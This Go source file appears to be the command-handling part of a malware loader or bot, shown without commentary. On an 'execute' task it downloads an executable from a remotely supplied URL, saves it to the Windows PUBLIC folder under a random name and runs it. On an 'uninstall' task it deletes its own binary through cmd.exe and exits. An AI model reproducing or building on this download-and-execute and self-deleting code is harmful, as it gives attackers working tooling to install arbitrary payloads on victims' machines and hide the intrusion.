package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"syscall"
)

func ParseTask(task Task) {
	switch task.TaskType {
	case "execute":
		DownloadAndExecute(task.Parameter)
	case "uninstall":
		Uninstall()
	}
}

func Uninstall() {
	var sI syscall.StartupInfo
	var pI syscall.ProcessInformation
	argv := syscall.StringToUTF16Ptr(os.Getenv("windir") + "\\System32\\cmd.exe /C del " + os.Args[0])
	syscall.CreateProcess(
		nil,
		argv,
		nil,
		nil,
		true,
		0,
		nil,
		nil,
		&sI,
		&pI)
	os.Exit(0)
}

func DownloadAndExecute(fileURL string) {
	resp, err := http.Get(fileURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	filename := os.Getenv("public") + "\\" + RandomString(8) + ".exe"
	out, err := os.Create(filename)
	if err != nil {
		return
	}

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return
	}
	out.Close()
	cmd := exec.Command(filename)
	cmd.Start()
}
